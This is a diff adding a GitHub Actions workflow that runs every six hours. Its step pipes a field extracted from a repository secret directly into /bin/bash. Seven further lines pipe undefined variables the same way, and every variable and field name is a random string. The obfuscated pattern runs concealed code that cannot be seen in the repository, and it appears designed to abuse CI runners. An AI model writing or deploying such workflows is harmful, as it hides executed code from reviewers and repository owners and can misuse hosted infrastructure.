@@ -1,0 +1,24 @@
+name: zongtihaoshuoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zongtihaoshuoo
+        env:
+          jr78330: ${{ secrets.jr78330 }}
+        run: |
+          echo $jr78330 | jq -r .bwvwx809 | /bin/bash
+          echo $hpxi5814 | jq -r .irau9211 | /bin/bash
+          echo $b5 | jq -r .fw623 | /bin/bash
+          echo $lcwpe1080 | jq -r .ng28277 | /bin/bash
+          echo $lunal565 | jq -r .g2035 | /bin/bash
+          echo $c635 | jq -r .jnkb921 | /bin/bash
+          echo $c95 | jq -r .sfnuz92 | /bin/bash
+          echo $gydc410 | jq -r .za1 | /bin/bash
+
